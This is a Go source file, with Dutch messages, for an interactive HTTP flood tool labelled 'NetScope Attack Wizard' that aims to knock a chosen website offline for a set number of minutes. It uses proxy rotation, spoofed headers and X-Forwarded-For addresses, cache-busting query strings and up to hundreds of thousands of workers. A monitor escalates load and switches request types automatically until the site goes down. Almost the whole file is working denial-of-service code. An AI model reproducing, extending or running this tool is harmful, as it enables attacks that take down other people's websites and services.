package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strings"
	"syscall"
	"sync"
	"sync/atomic"
	"time"
)

var (
	proxyList []string
	commonPaths = []string{
		"/", "/api/v1", "/login", "/search", "/wp-admin", "/admin", "/shop", "/cart",
	}
)


type domainStats struct {
	domain          string
	targetURL       string
	totalRequests   int64
	successRequests int64
	failedRequests  int64
	siteDown        bool
	siteDownSince   time.Time
	mu              sync.Mutex
	statusLog       []string

	// Escalation
	level           int
	vector          string
	concurrency     int32
}

func applyLevelSettings(o *options) {
	if o.concurrency > 0 {
		return
	}

	if o.level == 0 {
		o.level = 4
	}
	if o.level < 1 {
		o.level = 1
	}
	if o.level > 10 {
		o.level = 10
	}

	switch o.level {
	case 1:
		o.concurrency = 100
	case 2:
		o.concurrency = 500
	case 3:
		o.concurrency = 1500
	case 4:
		o.concurrency = 3000
	case 5:
		o.concurrency = 7000
	case 6:
		o.concurrency = 12000
	case 7:
		o.concurrency = 18000
	case 8:
		o.concurrency = 25000
	case 9:
		o.concurrency = 35000
	case 10:
		o.concurrency = 50000
	}

	fmt.Printf("🎚️  Power Level: %d -> %d Workers\n", o.level, o.concurrency)
}

func runAttack(domains []string, o options) {
	setRlimits()
	if o.proxyFile != "" {
		loadProxies(o.proxyFile)
	}

	fmt.Printf("⏳ Start L7 Stress Test voor %d minuten op %d doelen...\n", o.attackMinutes, len(domains))

	deadline := time.Now().Add(time.Duration(o.attackMinutes) * time.Minute)
	var allStats []*domainStats

	for _, d := range domains {
		d = normalizeDomain(d)
		targetURL := "https://" + d
		if o.noKeepAlive {
			targetURL = "http://" + d
		}

		s := &domainStats{
			domain:      d,
			targetURL:   targetURL,
			level:       o.level,
			vector:      "GET",
			concurrency: int32(o.concurrency / len(domains)),
		}
		if s.concurrency == 0 {
			s.concurrency = 1
		}
		allStats = append(allStats, s)

		// Start monitor
		go startHealthMonitor(s, deadline)

		// Start Attackers with dynamic workers
		// God Mode: Increase pool to a massive number to handle extreme concurrency
		for i := 0; i < 500000; i++ { 
			go worker(s, deadline, i, o.noKeepAlive)
		}
	}

	// Status logger
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	fmt.Println("🚀 Attackers launched. Monitoring status...")
	fmt.Println("--------------------------------------------------")

	for time.Now().Before(deadline) {
		<-ticker.C
		fmt.Printf("\n[%s] Status Update:\n", time.Now().Format(time.TimeOnly))
		for _, s := range allStats {
			s.mu.Lock()
			downStr := "✅ ONLINE"
			if s.siteDown {
				downDuration := time.Since(s.siteDownSince).Round(time.Second)
				downStr = fmt.Sprintf("❌ OFFLINE (Sinds %s)", downDuration)
			}

			fmt.Printf("  %s -> %s\n", s.domain, downStr)
			fmt.Printf("    Reqs: %d (Success: %d, Fail: %d)\n",
				atomic.LoadInt64(&s.totalRequests),
				atomic.LoadInt64(&s.successRequests),
				atomic.LoadInt64(&s.failedRequests))
			s.mu.Unlock()
		}
		fmt.Println("--------------------------------------------------")
	}

	fmt.Println("\n🏁 Aanval voltooid. Tijd verstreken.")
}

func worker(s *domainStats, deadline time.Time, id int, noKeepAlive bool) {
	transport := &http.Transport{
		DisableKeepAlives:   noKeepAlive,
		MaxIdleConns:        10,
		MaxIdleConnsPerHost: 10,
		IdleConnTimeout:     5 * time.Second,
	}

	client := &http.Client{
		Timeout:   7 * time.Second,
		Transport: transport,
	}

	for time.Now().Before(deadline) {
		// Dynamic concurrency control
		if int32(id) >= atomic.LoadInt32(&s.concurrency) {
			time.Sleep(500 * time.Millisecond)
			continue
		}

		// Proxy rotation
		if len(proxyList) > 0 {
			p := proxyList[rand.Intn(len(proxyList))]
			proxyURL, _ := url.Parse("http://" + p)
			transport.Proxy = http.ProxyURL(proxyURL)
		}

		// Randomized Path
		pId := rand.Intn(len(commonPaths))
		targetPath := s.targetURL + commonPaths[pId]

		// Cache-Bypass
		u, _ := url.Parse(targetPath)
		q := u.Query()
		q.Set("cb", fmt.Sprintf("%d", rand.Int63()))
		u.RawQuery = q.Encode()

		var req *http.Request
		s.mu.Lock()
		v := s.vector
		s.mu.Unlock()

		switch v {
		case "POST":
			jsonData := []byte(fmt.Sprintf(`{"id":%d,"data":"%d","query":"%s"}`, rand.Int63(), rand.Int63(), getRandomUserAgent()))
			req, _ = http.NewRequest("POST", u.String(), bytes.NewBuffer(jsonData))
			req.Header.Set("Content-Type", "application/json")
		case "HEAD":
			req, _ = http.NewRequest("HEAD", u.String(), nil)
		default:
			req, _ = http.NewRequest("GET", u.String(), nil)
		}

		req.Header.Set("User-Agent", getRandomUserAgent())
		req.Header.Set("Referer", getRandomReferrer())
		req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))

		atomic.AddInt64(&s.totalRequests, 1)
		resp, err := client.Do(req)
		if err != nil {
			atomic.AddInt64(&s.failedRequests, 1)
		} else {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
			if resp.StatusCode >= 500 {
				atomic.AddInt64(&s.failedRequests, 1)
			} else {
				atomic.AddInt64(&s.successRequests, 1)
			}
		}
	}
}

func loadProxies(file string) {
	f, err := os.Open(file)
	if err != nil {
		fmt.Printf("[!] Error laden proxies: %v\n", err)
		return
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		p := strings.TrimSpace(scanner.Text())
		if p != "" {
			proxyList = append(proxyList, p)
		}
	}
	fmt.Printf("[*] %d Proxies geladen.\n", len(proxyList))
}

func runSitePlof(o options) {
	fmt.Println("\n🔥 NetScope Attack Wizard: Voorbereiden van aanval")
	fmt.Println("────────────────────────────────────────────────────────────")

	domain := normalizeDomain(o.domain)

	// Step 1: Run measure to advise level
	fmt.Println("[*] Snelheidstest uitvoeren voor advies...")
	client := &http.Client{Timeout: 5 * time.Second}
	start := time.Now()
	resp, err := client.Get("https://" + domain)
	if err != nil {
		resp, err = client.Get("http://" + domain)
	}
	
	advLevel := 1
	if err == nil {
		duration := time.Since(start).Milliseconds()
		resp.Body.Close()
		fmt.Printf("[*] Gemeten latency: %dms\n", duration)
		if duration < 50 {
			advLevel = 3
		} else if duration < 150 {
			advLevel = 5
		} else {
			advLevel = 8
		}
	} else {
		fmt.Println("[!] Kon site niet bereiken voor test, we raden een zware aanval aan.")
		advLevel = 9
	}

	fmt.Printf("[*] Geadviseerd Attack Level: %d (1-10)\n", advLevel)

	// Step 2: Level selection
	levelStr := promptInput("Op welk level wil je de aanval runnen? (1-10 of 'C' voor CUSTOM)", "Kies 1-10 / C", "")
	
	if strings.ToUpper(levelStr) == "C" {
		maxRec := measureSystemResources()
		fmt.Printf("\n[CUSTOM MODE] Systeem Capaciteit:\n")
		fmt.Printf("  CPU Cores: %d\n", runtime.NumCPU())
		fmt.Printf("  Geadviseerde Max Workers: %d\n", maxRec)
		
		customIn := promptInput("Hoeveel workers wil je gebruiken? (bijv. 10000 of 'max')", "Aantal / max", "")
		if strings.ToLower(customIn) == "max" {
			o.concurrency = maxRec
			fmt.Printf("[*] Setting to MAX: %d workers\n", o.concurrency)
		} else {
			fmt.Sscanf(customIn, "%d", &o.concurrency)
		}
		if o.concurrency <= 0 { o.concurrency = 1000 }
	} else {
		fmt.Sscanf(levelStr, "%d", &o.level)
		if o.level < 1 { o.level = 1 }
		if o.level > 10 { o.level = 10 }
		applyLevelSettings(&o)
	}

	// Step 3: Confirmation
	confirm := promptInput(fmt.Sprintf("Weet je zeker dat je met %d workers wilt runnen? (j/n)", o.concurrency), "j/n", "")
	if strings.ToLower(confirm) != "j" {
		fmt.Println("Aanval afgebroken.")
		return
	}

	// Step 4: Duration
	timeStr := promptInput("Hoe lang moet de site offline liggen? (minuten)", "Bijv: 5", "")
	fmt.Sscanf(timeStr, "%d", &o.attackMinutes)
	if o.attackMinutes <= 0 { o.attackMinutes = 1 }

	fmt.Printf("\n🚀 ATTACK STARTED: %s | Workers: %d | Duur: %d min\n", domain, o.concurrency, o.attackMinutes)
	fmt.Println("Druk op Ctrl+C om de aanval voortijdig te stoppen.")
	
	runAttack([]string{domain}, o)
}

func measureSystemResources() int {
	cpus := runtime.NumCPU()
	// God Mode: 250.000 workers per core. Absolute max throughput.
	return cpus * 250000
}

func setRlimits() {
	var rLimit syscall.Rlimit
	err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rLimit)
	if err != nil {
		fmt.Printf("[!] Kon huidige FD limiet niet ophalen: %v\n", err)
		return
	}

	// Probeer limieten naar het uiterste te pushen
	rLimit.Cur = rLimit.Max
	err = syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rLimit)
	if err != nil {
		// Als we geen root zijn of OS het weigert, probeer een goede middenweg
		rLimit.Cur = 65535
		if rLimit.Cur > rLimit.Max {
			rLimit.Cur = rLimit.Max
		}
		syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rLimit)
	}
	
	syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rLimit)
	fmt.Printf("[*] Systeem Limiet Geoptimaliseerd: %d Open Files\n", rLimit.Cur)
}

func startHealthMonitor(s *domainStats, deadline time.Time) {
	monitorClient := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			DisableKeepAlives: true,
		},
	}

	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()
	time.Sleep(1 * time.Second)

	checkCount := 0
	for time.Now().Before(deadline) {
		<-ticker.C
		checkCount++
		req, _ := http.NewRequest("GET", s.targetURL, nil)
		req.Header.Set("User-Agent", "NetScope-Monitor/1.0")

		resp, err := monitorClient.Do(req)

		s.mu.Lock()
		wasDown := s.siteDown
		s.mu.Unlock()

		if err != nil {
			if !wasDown {
				s.mu.Lock()
				if !s.siteDown {
					s.siteDown = true
					s.siteDownSince = time.Now()
					msg := fmt.Sprintf("[%s] 💥 %s is DOWN!", time.Now().Format(time.TimeOnly), s.domain)
					s.statusLog = append(s.statusLog, msg)
					fmt.Println("\n" + msg)
				}
				s.mu.Unlock()
			}
		} else {
			resp.Body.Close()
			if resp.StatusCode >= 500 {
				if !wasDown {
					s.mu.Lock()
					if !s.siteDown {
						s.siteDown = true
						s.siteDownSince = time.Now()
						msg := fmt.Sprintf("[%s] 💥 %s is throwing 5xx Errors!", time.Now().Format(time.TimeOnly), s.domain)
						s.statusLog = append(s.statusLog, msg)
						fmt.Println("\n" + msg)
					}
					s.mu.Unlock()
				}
			} else {
				if wasDown {
					s.mu.Lock()
					s.siteDown = false
					msg := fmt.Sprintf("[%s] 🔄 %s is RECOVERED!", time.Now().Format(time.TimeOnly), s.domain)
					s.statusLog = append(s.statusLog, msg)
					fmt.Println("\n" + msg)
					s.mu.Unlock()
				} else {
					// Smart Escalation
					if checkCount%5 == 0 { // Every 15 seconds of remaining online
						s.mu.Lock()
						// Increase concurrency
						newConc := atomic.LoadInt32(&s.concurrency) + 1000
						if newConc > 60000 {
							newConc = 60000
						}
						atomic.StoreInt32(&s.concurrency, newConc)

						// Rotate Vectors
						oldV := s.vector
						switch oldV {
						case "GET":
							s.vector = "POST"
						case "POST":
							s.vector = "HEAD"
						default:
							s.vector = "GET"
						}
						fmt.Printf("[%s] 📈 %s is nog online. Escalatie: %d workers | Vector: %s\n", time.Now().Format(time.TimeOnly), s.domain, newConc, s.vector)
						s.mu.Unlock()
					}
				}
			}
		}
	}
}
